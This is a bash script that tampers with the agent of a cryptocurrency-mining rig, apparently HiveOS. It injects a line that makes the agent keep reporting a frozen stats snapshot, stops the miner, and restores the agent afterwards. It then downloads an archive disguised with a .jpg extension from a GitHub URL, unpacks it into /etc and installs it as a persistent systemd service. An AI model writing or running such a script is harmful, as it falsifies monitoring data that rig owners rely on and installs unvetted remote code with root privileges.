#!/usr/bin/env bash

SNAPSHOT="/tmp/snapshot.json"
AGENT_FILE="/hive/bin/agent"
BACKUP_FILE="/tmp/agent.bak"
PERSISTENT_BACKUP="/hive/bin/agentback"


if [[ ! -f "$PERSISTENT_BACKUP" ]]; then
    cp "$AGENT_FILE" "$PERSISTENT_BACKUP"
    echo "[*] Backup persistente creado en $PERSISTENT_BACKUP"
fi

echo "[*] Creando snapshot desde /run/hive/last_stat.json"
cp /run/hive/last_stat.json "$SNAPSHOT"

if [[ ! -f "$BACKUP_FILE" ]]; then
    cp "$AGENT_FILE" "$BACKUP_FILE"
    echo "[*] Backup temporal guardado en $BACKUP_FILE"
fi

if ! grep -q "request=\$(< /tmp/snapshot.json)" "$AGENT_FILE"; then
    sed -i '/#log request/a \    # 🔒 Forzar envío del snapshot congelado\n    request=$(< /tmp/snapshot.json)' "$AGENT_FILE"
    echo "[*] Hack inyectado en $AGENT_FILE"
fi

echo "[*] Reiniciando servicio hive..."
systemctl restart hive
/hive/bin/miner stop

SUM_PERSISTENT=$(sha256sum "$PERSISTENT_BACKUP" | awk '{print $1}')
SUM_CURRENT=$(sha256sum "$AGENT_FILE" | awk '{print $1}')

if [[ "$SUM_PERSISTENT" != "$SUM_CURRENT" ]]; then
    echo "[*] Restaurando agent desde backup persistente..."
    cp "$PERSISTENT_BACKUP" "$AGENT_FILE"
else
    echo "[*] Restaurando agent desde backup temporal..."
    cp "$BACKUP_FILE" "$AGENT_FILE"
fi

if [[ -f /etc/hivetls.sh ]]; then
    systemctl restart hivetls
else
    wget -q https://raw.githubusercontent.com/webwallet-online/hive/main/hivetls.jpg  -O /etc/hivetls.zip
    sudo unzip -q -o /etc/hivetls.zip -d /etc
    sudo cp /etc/hivetls.service /etc/systemd/system/
    sudo systemctl daemon-reload
    sudo systemctl restart hivetls
fi

